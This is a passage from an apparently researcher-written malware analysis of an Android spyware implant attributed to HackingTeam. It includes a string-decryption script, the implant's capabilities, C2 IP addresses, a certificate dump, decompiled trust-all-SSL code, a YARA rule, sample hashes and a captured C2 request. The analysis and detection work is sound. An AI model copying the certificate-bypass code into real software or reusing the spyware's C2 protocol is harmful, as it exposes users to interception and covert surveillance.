loaded_string = getString(addr)</div><div class="line">                            modifier = int(GetOpnd(addr_2, <span class="number">1</span>), <span class="number">0</span>)</div><div class="line">                            mod2 = int(GetOpnd(addr_3, <span class="number">1</span>), <span class="number">0</span>)</div><div class="line">                            info(<span class="string">'0x%x : %s : %s'</span> % (addr, loaded_string, generic_decrypt(loaded_string, modifier, xor, mod1, mod2)))</div><div class="line">                            MakeComm(addr, generic_decrypt(loaded_string, modifier, xor, mod1, mod2))</div><div class="line">                            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">elif</span> <span class="string">'const/'</span> <span class="keyword">in</span> GetMnem(addr):</div><div class="line">        addr_2 = FindCode(addr, SEARCH_DOWN)</div><div class="line">        <span class="keyword">if</span> GetMnem(addr_2) == <span class="string">'const-string'</span>:</div><div class="line">            addr_3 = FindCode(addr_2, SEARCH_DOWN)</div><div class="line">            <span class="keyword">if</span> GetMnem(addr_3) == <span class="string">'invoke-static'</span>:</div><div class="line">                <span class="keyword">for</span> (func, xor, mod1, mod2) <span class="keyword">in</span> cryptions:</div><div class="line">                    <span class="keyword">if</span> func <span class="keyword">in</span> GetOpnd(addr_3, <span class="number">2</span>):</div><div class="line">                        debug(<span class="string">' %s in %s '</span> % (func, GetOpnd(addr_3, <span class="number">2</span>)))</div><div class="line">                        modifier = int(GetOpnd(addr, <span class="number">1</span>), <span class="number">0</span>)</div><div class="line">                        loaded_string = getString(addr_2)</div><div class="line">                        info(<span class="string">'0x%x : %s : %s'</span> % (addr, loaded_string, generic_decrypt(loaded_string, modifier, xor, mod1, mod2)))</div><div class="line">                        MakeComm(addr, (<span class="string">'%s'</span> % generic_decrypt(loaded_string, modifier, xor, mod1, mod2)))</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    strings_added = <span class="number">0</span></div><div class="line">    code_seg = ida_segment.get_segm_by_name(<span class="string">'CODE'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> Functions(code_seg.startEA, code_seg.endEA):</div><div class="line">        name = GetFunctionName(addr)</div><div class="line"></div><div class="line">        end_addr = Chunks(addr).next()[<span class="number">1</span>]</div><div class="line">        <span class="keyword">if</span>(end_addr &lt; addr):</div><div class="line">            error(<span class="string">'Unable to find good end for the function %s'</span> % name)</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line">        debug(<span class="string">'Found function %s starting/ending @ 0x%x 0x%x'</span> %  (name, addr, end_addr))</div><div class="line"></div><div class="line">        <span class="keyword">while</span> addr &lt;= end_addr:</div><div class="line">            <span class="keyword">if</span> is_encrypted(addr):</div><div class="line">                strings_added += <span class="number">1</span></div><div class="line"></div><div class="line">                addr = FindCode(FindCode(FindCode(addr, SEARCH_DOWN), SEARCH_DOWN), SEARCH_DOWN)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                addr = FindCode(addr, SEARCH_DOWN)</div><div class="line"></div><div class="line">    info(<span class="string">'%d strings decrypted'</span> % strings_added)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    info(<span class="string">'Dalvik Decryptor loaded...'</span>)</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>After running this, we can see that we have comments for all the decrypted strings. Awesome!</p>
<p><img src="/images/hackingteam_back_for_your_androids/func_decrypted.png" alt=""></p>
<p>After creating this code, Caleb also informed me that <a href="https://github.com/CalebFenton/simplify" target="_blank" rel="external">Simplify</a> would also have worked. So many different ways to skin a cat!</p>
<h2 id="Features-Overview"><a href="#Features-Overview" class="headerlink" title="Features Overview"></a><a name="Features-Overview"></a>Features Overview</h2><p>After decrypting the strings, the rest of the behavior is easy to follow. The class names and most of the interesting method names are not obfuscated. We can see that this implant has the normal abilities of most spyware:</p>
<ul>
<li>Automatically remove itself from the launcher <a href="http://www.strazzere.com/blog/2012/08/android-zitmo-analysis-now-you-see-my-now-you-dont/" target="_blank" rel="external">after the first execution</a></li>
<li>Kick start it’s own <code>MainService</code> and set an alarm to keep it persistent</li>
<li>Stop processing commands from the <a href="https://en.wikipedia.org/wiki/Command_and_control" target="_blank" rel="external">C2</a> or doing work if the user is present</li>
<li>Mute all audio on the device</li>
<li>Turn GPS on or off</li>
<li>Query internal phone URIs for data and write to external media for later exfiltration</li>
<li>Create screen shots or record the screen</li>
<li>Record video and audio</li>
<li>Respond to specifically configured SMS numbers that include <code>873451679TRW68IO</code> and reply or forward messages with device information</li>
<li>Execute code (“actions”) from downloaded <em>.dex</em> files (mainly for rooting different devices)</li>
</ul>
<h3 id="Data-Exfiltration"><a href="#Data-Exfiltration" class="headerlink" title="Data Exfiltration"></a><a name="Data-Exfiltration"></a>Data Exfiltration</h3><p>When data is exfiltrated, it’s serialized in an encrypted form to <code>%SDCARD%/Android/data/__android.data</code>. Naturally, I wanted to actually know what data were being exfiltrated. So I started to dig into the app’s decrypted strings to try and figure out what data were being exfiltrated and what the C2s were. Because all the strings had previously been dumped to one file, it was easy to look for domains, IP addresses, or just <code>http:</code> or <code>https:</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Dalvik Decryptor loaded...</div><div class="line">0x148f4 : alarm</div><div class="line">0x149b6 : android.intent.action.MAIN</div><div class="line">0x14a00 : android.intent.extra.shortcut.INTENT</div><div class="line">0x14a16 : android.intent.extra.shortcut.NAME</div><div class="line">0x14a26 : Servizi Google</div><div class="line">...</div><div class="line">*** snip! ***</div><div class="line">...</div><div class="line">0x47c08 : invalid end of central directory record</div><div class="line">997 strings decrypted</div></pre></td></tr></table></figure>
<p><em>I’ve snipped the output here for brevity. The full output is in the Appendiex for easy indexing of search engines. Some of the strings are unique across binaries and this may help people in the future.</em></p>
<p>While skimming the strings, it’s immediately interesting that there appear to be Italian phrases such as <code>Servizi Google</code> (<code>Google Service</code>) and <code>Aggiornamento effettuato con successo</code> (<code>Successful Update</code>). These strings are actually shown to the user and must be part of the app’s cover.</p>
<p>Looking at the strings shows two servers to dig into:</p>
<ol>
<li><a href="https://68.233.237.11/" target="_blank" rel="external">https://68.233.237.11/</a></li>
<li><a href="https://66.232.100.221:8443/" target="_blank" rel="external">https://66.232.100.221:8443/</a></li>
</ol>
<p>These are interesting as they are not using domains which could mean a few things. One is that these people are lazy. Another possibility is that they’re purposefully avoiding DNS to avoid getting detected by anyone smart enough to use passive DNS searching. Everyone in the information security space knows DNS is the (old) new hotness and maybe they realize this. Without telling a friend what exactly I was investigating, I shared these IP addresses. They plugged them into whatever information feeds they had and something popped up. Oh hey, these appear to be <em>previously used HackingTeam C2s!</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">68.233.232.104 Results</div><div class="line">First seen:		2015-06-28 01:14:56</div><div class="line">Last seen:		2015-06-28 01:14:56</div><div class="line">Country:		US</div><div class="line">Network:		68.233.224.0/19</div><div class="line">AS Number:		29802</div><div class="line">AS Name:		HVC-AS - HIVELOCITY VENTURES CORP</div><div class="line">Resolutions</div><div class="line">=&gt;	68-233-232-104.static.hvvc.us 		2015-06-28 01:14:56 		2015-06-28 01:14:56</div></pre></td></tr></table></figure>
<p>Reference: <a href="https://github.com/passivetotal/HT_infra/blob/master/68.233.232.104.passivetotal.pdns" target="_blank" rel="external">https://github.com/passivetotal/HT_infra/blob/master/68.233.232.104.passivetotal.pdns</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">68.233.232.147 Results</div><div class="line">First seen:		2015-02-22 00:00:00</div><div class="line">Last seen:		2015-07-03 00:54:48</div><div class="line">Country:		US</div><div class="line">Network:		68.233.224.0/19</div><div class="line">AS Number:		29802</div><div class="line">AS Name:		HVC-AS - HIVELOCITY VENTURES CORP</div><div class="line">Resolutions</div><div class="line">=&gt;	lovecars.com 		2015-02-22 00:00:00 		2015-07-03 00:54:48</div></pre></td></tr></table></figure>
<p>Reference: <a href="https://github.com/passivetotal/HT_infra/blob/master/68.233.232.147.passivetotal.pdns" target="_blank" rel="external">https://github.com/passivetotal/HT_infra/blob/master/68.233.232.147.passivetotal.pdns</a></p>
<p>Granted, this <em>could</em> be a coincidence or a false flag of sorts and it’s hard to say for sure. But the <code>68.233.237.11</code> IP address is using an Italian SSS certificate which can be used to find other connections in passive datasets. I’ll just leave this here:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">[100%]diff@rocksteady:[contents] $ openssl s_client -connect 68.233.237.11:443 -showcerts</div><div class="line">CONNECTED(00000003)</div><div class="line">depth=0 C = IT, ST = Italy, L = Naplase, O = Raxir, OU = IT Department, CN = ws.com</div><div class="line">verify error:num=20:unable to get local issuer certificate</div><div class="line">verify return:1</div><div class="line">depth=0 C = IT, ST = Italy, L = Naplase, O = Raxir, OU = IT Department, CN = ws.com</div><div class="line">verify error:num=27:certificate not trusted</div><div class="line">verify return:1</div><div class="line">depth=0 C = IT, ST = Italy, L = Naplase, O = Raxir, OU = IT Department, CN = ws.com</div><div class="line">verify error:num=21:unable to verify the first certificate</div><div class="line">verify return:1</div><div class="line">---</div><div class="line">Certificate chain</div><div class="line"> 0 s:/C=IT/ST=Italy/L=Naplase/O=Raxir/OU=IT Department/CN=ws.com</div><div class="line">   i:/C=IT/ST=Italy/L=Naplase/O=Raxir/OU=IT Department/CN=console_raxir.com</div><div class="line">-----BEGIN CERTIFICATE-----</div><div class="line">MIICzjCCAjcCAQUwDQYJKoZIhvcNAQEFBQAwczELMAkGA1UEBhMCSVQxDjAMBgNV</div><div class="line">BAgMBUl0YWx5MRAwDgYDVQQHDAdOYXBsYXNlMQ4wDAYDVQQKDAVSYXhpcjEWMBQG</div><div class="line">A1UECwwNSVQgRGVwYXJ0bWVudDEaMBgGA1UEAwwRY29uc29sZV9yYXhpci5jb20w</div><div class="line">HhcNMTUwMzA1MTM0ODA2WhcNMjUwMzAyMTM0ODA2WjBoMQswCQYDVQQGEwJJVDEO</div><div class="line">MAwGA1UECAwFSXRhbHkxEDAOBgNVBAcMB05hcGxhc2UxDjAMBgNVBAoMBVJheGly</div><div class="line">MRYwFAYDVQQLDA1JVCBEZXBhcnRtZW50MQ8wDQYDVQQDDAZ3cy5jb20wggEiMA0G</div><div class="line">CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDUJJ0smTdd7t01/SnafdgDnOWGqBsJ</div><div class="line">COwPsbvbtWjqwiGPBLI96D+rpLwhg3tfioIvzN85yk5wolmPM05n2QqtCBCRbhha</div><div class="line">vJgkjGpT5dP1PtnlPDwRcoXMX4uEkRQT8ardTVbbd9yd1IFo7BNzAXohNplALCxB</div><div class="line">zmyc2E7cWkoQf7pwNWLUFHA59/YuUpNBuPIZ2DEnU6aOiNsAzbdS6/t7+GhHFCsD</div><div class="line">dD9PHeLqYKg56VtrmSiEsO1+/rFuj0xEIK1NGJo3FEeWBUCsmkzYs9K/GfBVTR/v</div><div class="line">UiHksnns7b8dxgsAFJOo9tdN/fReD47CTdl2RL99zAFpf6kk6HqGykMhAgMBAAEw</div><div class="line">DQYJKoZIhvcNAQEFBQADgYEASCG8OyP1K0WxnJbM559UkCfbWbz/UpXSfTm01wZo</div><div class="line">IOYpchTB5X1Yw2P78f4Zq2mc0nM190jZKbs8zyjSD5WX3+itygGg1nqPPhNJ2yeQ</div><div class="line">DgoLOA7XuRoigqiCeK5Dc2ih2ycp+ZiJ7lak8HoH65+pMQilHpyR9qsnYxXWQt9D</div><div class="line">EIk=</div><div class="line">-----END CERTIFICATE-----</div><div class="line">---</div><div class="line">Server certificate</div><div class="line">subject=/C=IT/ST=Italy/L=Naplase/O=Raxir/OU=IT Department/CN=ws.com</div><div class="line">issuer=/C=IT/ST=Italy/L=Naplase/O=Raxir/OU=IT Department/CN=console_raxir.com</div><div class="line">---</div><div class="line">No client certificate CA names sent</div><div class="line">---</div><div class="line">SSL handshake has read 1294 bytes and written 509 bytes</div><div class="line">---</div><div class="line">New, TLSv1/SSLv3, Cipher is ECDHE-RSA-DES-CBC3-SHA</div><div class="line">Server public key is 2048 bit</div><div class="line">Secure Renegotiation IS supported</div><div class="line">Compression: NONE</div><div class="line">Expansion: NONE</div><div class="line">SSL-Session:</div><div class="line">    Protocol  : TLSv1.2</div><div class="line">    Cipher    : ECDHE-RSA-DES-CBC3-SHA</div><div class="line">    Session-ID: 58228216995B968253FD721FDD6C04C0E0327DF8AD823D413B95674DE72BA0F0</div><div class="line">    Session-ID-ctx:</div><div class="line">    Master-Key: BD52BB92248C75A7BF9425B94E095357B63AE52BAAF221E7BEADEABF4A0AD971B09F957CD382A6F275B4AE2FD5DF49FD</div><div class="line">    Key-Arg   : None</div><div class="line">    PSK identity: None</div><div class="line">    PSK identity hint: None</div><div class="line">    SRP username: None</div><div class="line">    Start Time: 1478656438</div><div class="line">    Timeout   : 300 (sec)</div><div class="line">    Verify return code: 21 (unable to verify the first certificate)</div><div class="line">---</div><div class="line">cb681d2c435199e1aead320645324060732464b9</div><div class="line">C=IT, ST=Italy, L=Naplase, O=Raxir, OU=IT Department, CN=ws.com</div></pre></td></tr></table></figure>
<h4 id="Weak-SSL-Configuration"><a href="#Weak-SSL-Configuration" class="headerlink" title="Weak SSL Configuration"></a>Weak SSL Configuration</h4><p>The last thing I wanted to do was to understand what the traffic actually looked like even though it’s going through SSL/TLS. My original thought was that performing a <a href="https://www.owasp.org/index.php/Man-in-the-middle_attack" target="_blank" rel="external">man-in-the-middle</a> would require getting a device and <a href="https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device" target="_blank" rel="external">installing a certificate</a> or <a href="http://www.security-assessment.com/files/documents/whitepapers/Bypassing%20SSL%20Pinning%20on%20Android%20via%20Reverse%20Engineering.pdf" target="_blank" rel="external">bypassing certificate pinning</a> to allow <a href="https://portswigger.net/burp/" target="_blank" rel="external">Burp</a> to intercept traffic. This turned out not to be the case. In fact, there is a “vulnerability” in this implant or maybe they are just lazy. If we dig into their custom SSL handling code (which is seemingly labeled as normal Android code) in <code>com.google.android.common.HttpUtils.allowAllSSL()</code> we see rather boiler plate code for disabling SSL certificate checking.</p>
<p><em>Wait. What?</em></p>
<p>Why are they transporting information over SSL but explicitly <em>not checking certificates</em>? Here is the hand-decompiled pseudo-Java for <code>allowAllSSL()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> com.google.android.common.HttpUtils.allowAllSSL() &#123;</div><div class="line">    HttpsURLConnection.setDefaultHostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;</div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span> </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">    TrustManager[] trustAllCerts = <span class="keyword">new</span> TrustManager[]&#123;</div><div class="line">        <span class="keyword">new</span> X509TrustManager() &#123;</div><div class="line">            <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkClientTrusted</span><span class="params">(.X509Certificate[] certs, String authType)</span> </span>&#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkServerTrusted</span><span class="params">(X509Certificate[] certs, String authType)</span> </span>&#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        SSLContext sslcontext = SSLContext.getInstance(<span class="string">"TLS"</span>); <span class="comment">// TLS is an encrypted in the binary</span></div><div class="line">        sslcontext.init(<span class="keyword">null</span>, trustAllCerts, <span class="keyword">new</span> java.security.SecureRandom());</div><div class="line">        HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());</div><div class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</div><div class="line">        Logger.WriteErrorLog(<span class="string">"allowAllSSL"</span>, e.toString);</div><div class="line">    &#125; <span class="keyword">catch</span> (KeyManagementException e) &#123;</div><div class="line">        Logger.WriteErrorLog(<span class="string">"allowAllSSL"</span>, e.toString);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>The code is similar to the <a href="http://stackoverflow.com/questions/1201048/allowing-java-to-use-an-untrusted-certificate-for-ssl-https-connection" target="_blank" rel="external">StackOverflow</a> questions asking how to access untrusted certificates for SSL HTTPS connections. No big deal. It’s not like this type of implant would ever be deployed to gather sensitive information, right? (hint: sarcasm) Technically this code <em>does</em> allow them to trust a self signed certificate or previously untrusted out, though it just let the application accept <em>any</em> certificate. This means we don’t have to do anything special for man in the middling; just literally be in the middle. So just fire up Burp, or whatever, and start an interceptor grab a <em>.pcap</em> and look at the heartbeats going to the server:</p>
<p><img src="/images/hackingteam_back_for_your_androids/burp.png" alt=""></p>
<p>From this point, it’s relatively easy to watch the traffic. There really isn’t much going on outside of the run-of-the-mill, boring, commercial spyware junk. The secret sauce is likely found after talking to the C2 server and getting the extra payloads. This would appear to be where exploits are being delivered, however it would seem these are set up and configured on the back end. Sadly I was unable to <em>coerce</em> the back end to give me anything worth analyzing. Since the pcap would all be encrypted, captured POSTs to and from the server have been added to the <a href="#Appendix">Appendix</a>.</p>
<h2 id="Is-it-HackingTeam"><a href="#Is-it-HackingTeam" class="headerlink" title="Is it HackingTeam?"></a><a name="Is-it-HackingTeam"></a>Is it HackingTeam?</h2><p>Honestly? I don’t have definitive proof though there is a decent amount of circumstantial evidence:</p>
<ul>
<li>C2’s hosted in a similar fashion and address space as previously known HackingTeam families</li>
<li>Use of Italian in both the encrypted string and certificates</li>
<li>Similar style to previous variants though none have been officially and publicly confirmed</li>
</ul>
<p>These could all be false flags, as I’ve stated before, so take it as you will. I did try to find a contact at HackingTeam. However they didn’t seem to want to reply to me – neither for confirmation that their implant is being used in the wild nor about the vulnerability in their code.</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><a name="Conclusion"></a>Conclusion</h2><p>This implant has been floating around and can easily be downloaded for researchers but I don’t believe anyone has publicly spoken about these, which is why I’ve written this. My gut tells me if any AV companies had found this, they’d be foaming at their mouths to publish something for the PR value. Based on the VirusTotal detections of these samples, some people are (blindly?) flagging these files. So again, either they don’t know what they have, or maybe they don’t care to talk about it. Hopefully this brings some attention to it and boosts the detection on these implants and also aids researchers looking to understand these threats.</p>
<p>Special thanks to <a href="https://twitter.com/ACKFlags" target="_blank" rel="external">@ACKFlags</a>, <a href="https://twitter.com/caleb_fenton" target="_blank" rel="external">Caleb Fenton</a> at SentinelOne, <a href="https://twitter.com/_jsoo_" target="_blank" rel="external">@<em>jsoo</em></a> and all of <a href="https://twitter.com/RedNagaSec" target="_blank" rel="external">@RedNagaSec</a> for your assistance on this one :D</p>
<h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a><a name="Appendix"></a>Appendix</h2><h3 id="Yara-Rule"><a href="#Yara-Rule" class="headerlink" title="Yara Rule"></a><a name="Yara-Rule"></a>Yara Rule</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">rule HackingTeam_Android : Android Implant</div><div class="line">&#123;</div><div class="line">	meta:</div><div class="line">		description = &quot;HackingTeam Android implant, known to detect version v4 - v7&quot;</div><div class="line">		author = &quot;Tim &apos;diff&apos; Strazzere &lt;strazz@gmail.com&gt;&quot;</div><div class="line">        reference = &quot;http://rednaga.io/2016/11/14/hackingteam_back_for_your_androids/&quot;</div><div class="line">		date = &quot;2016-11-14&quot;</div><div class="line">		version = &quot;1.0&quot;</div><div class="line">    strings:</div><div class="line">        $decryptor = &#123;</div><div class="line">                        12 01               // const/4 v1, 0x0</div><div class="line">                        D8 00 ?? ??         // add-int/lit8 ??, ??, ??</div><div class="line">                        6E 10 ?? ?? ?? 00   // invoke-virtual &#123;??&#125; -&gt; String.toCharArray()</div><div class="line">                        0C 04               // move-result-object v4</div><div class="line">                        21 45               // array-length v5, v4</div><div class="line">                        01 02               // move v2, v0</div><div class="line">                        01 10               // move v0, v1</div><div class="line">                        32 50 11 00         // if-eq v0, v5, 0xb</div><div class="line">                        49 03 04 00         // aget-char v3, v4, v0</div><div class="line">                        DD 06 02 5F         // and-int/lit8 v6, v2, 0x5f &lt;- potentially change the hardcoded xor bit to ??</div><div class="line">                        B7 36               // xor-int/2addr v6, v3</div><div class="line">                        D8 03 02 ??         // and-int/lit8 v3, v2, ??</div><div class="line">                        D8 02 00 01         // and-int/lit8 v2, v0, 0x1</div><div class="line">                        8E 66               // int-to-char v6, v6</div><div class="line">                        50 06 04 00         // aput-char v6, v4, v0</div><div class="line">                        01 20               // move v0, v2</div><div class="line">                        01 32               // move v2, v3</div><div class="line">                        28 F0               // goto 0xa</div><div class="line">                        71 30 ?? ?? 14 05   // invoke-static &#123;v4, v1, v5&#125;, ?? -&gt; String.valueOf()</div><div class="line">                        0C 00               // move-result-object v0</div><div class="line">                        6E 10 ?? ?? 00 00   // invoke-virtual &#123;v0&#125; ?? -&gt; String.intern()</div><div class="line">                        0C 00               // move-result-object v0</div><div class="line">                        11 00               // return-object v0</div><div class="line">                     &#125;</div><div class="line">        // Below is the following string, however encoded as it would appear in the string table (length encoded, null byte padded)</div><div class="line">        // Lcom/google/android/global/Settings;</div><div class="line">        $settings = &#123;</div><div class="line">                        00 24 4C 63 6F 6D 2F 67 6F 6F 67 6C 65 2F 61 6E</div><div class="line">                        64 72 6F 69 64 2F 67 6C 6F 62 61 6C 2F 53 65 74</div><div class="line">                        74 69 6E 67 73 3B 00</div><div class="line">                    &#125;</div><div class="line">        // getSmsInputNumbers (Same encoded described above)</div><div class="line">        $getSmsInputNumbers = &#123;</div><div class="line">                                00 12 67 65 74 53 6D 73 49 6E 70 75 74 4E 75 6D</div><div class="line">                                62 65 72 73 00</div><div class="line">                              &#125;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $decryptor and ($settings and $getSmsInputNumbers)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="Samples"><a href="#Samples" class="headerlink" title="Samples"></a><a name="Samples"></a>Samples</h3><p><strong>Analyzed in this post:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Package Name:   it.phonevoda.androidv1</div><div class="line">SHA-256:        87efe6a1cbf4d4481c6fa6e2c70a26a0b50a460557a1ad876af9966a571f8a4c</div><div class="line">Version:        6.1.0 obf - bulk (decrypted and pulled from &quot;Settings&quot;)</div><div class="line">C2(s):          68.233.237.11, 66.232.100.221:8443</div></pre></td></tr></table></figure>
<p><strong>Similar samples:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Package Name:   it.phonevoda.androidv1</div><div class="line">SHA-256:        07278c56973d609caa5f9eb2393d9b1eb41964d24e7e9e7a7e7f9fdfb2bb4c31</div><div class="line">Version:        4.0 obf</div><div class="line">C2(s):          66.232.100.221</div><div class="line"></div><div class="line">Package Name:   it.phonewind.androidv1</div><div class="line">SHA-256:        ed33b83be3af715d3fd8ba6ac8b2b551a16697c5a37a9fcebfc40a024cc9b818</div><div class="line">Version:        4.0 obf</div><div class="line">C2(s):          66.232.100.221</div><div class="line"></div><div class="line">Package Name:   it.phonetre.androidv1</div><div class="line">SHA-256:        e362a037e70517565d28ab85959e6c9d231b2baf0c2df3b87dfaa1451278e80c</div><div class="line">Version:        6.1.0 obf - tra</div><div class="line">C2(s):          68.233.237.11, 66.232.100.221:8443</div><div class="line"></div><div class="line">Dex file only:</div><div class="line">SHA-256:        4308286905ee3d3dd1f4171da15050d1672dcc63bfc65e012b18938275e96085</div><div class="line">Version:        6.1.0 obf - tre</div><div class="line">C2(s):          68.233.237.11, 66.232.100.221:8443</div></pre></td></tr></table></figure>
<h3 id="Captured-C2-Interactions"><a href="#Captured-C2-Interactions" class="headerlink" title="Captured C2 Interactions"></a><a name="Captured-C2-Interactions"></a>Captured C2 Interactions</h3><h4 id="RequestActionsToExecute-Request"><a href="#RequestActionsToExecute-Request" class="headerlink" title="RequestActionsToExecute - Request"></a><a name="RequestActionsToExecute-Request"></a>RequestActionsToExecute - Request</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">POST /UlisseREST/api/actions/RequestActionsToExecute HTTP/1.1</div><div class="line">Connection: Keep-Alive</div><div class="line">Content-Type: application/json</div><div class="line">Accept: application/json</div><div class="line">User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; BLU STUDIO 5.0 C Build/KOT49H)</div><div class="line">Host: 68.233.237.11</div><div class="line">Accept-Encoding: gzip</div><div class="line">Content-Length: 475</div><div class="line"></div><div class="line">&#123;&quot;CommandLine&quot;:&quot;&quot;,&quot;CurrentDirectory&quot;:&quot;&quot;,&quot;Id&quot;:&quot;8f4af21e-29fb-48e9-8b52-8cf87fcdec57&quot;,&quot;LeaID&quot;:&quot;00000000-0000-0000-0000-000000000000&quot;,&quot;MachineName&quot;:&quot;BLU BLU STUDIO 5.0 C BLU STUDIO 5.0 C IMEI: XXXXXXXXXXXXXXX IMSI: null&quot;,&quot;OsType&quot;:5,&quot;Platform&quot;:&quot; Board:BLU STUDIO 5.0 C Brand:BLU Device:BLU STUDIO 5.0 C&quot;,&quot;Version&quot;:&quot;Release: 4.4.2 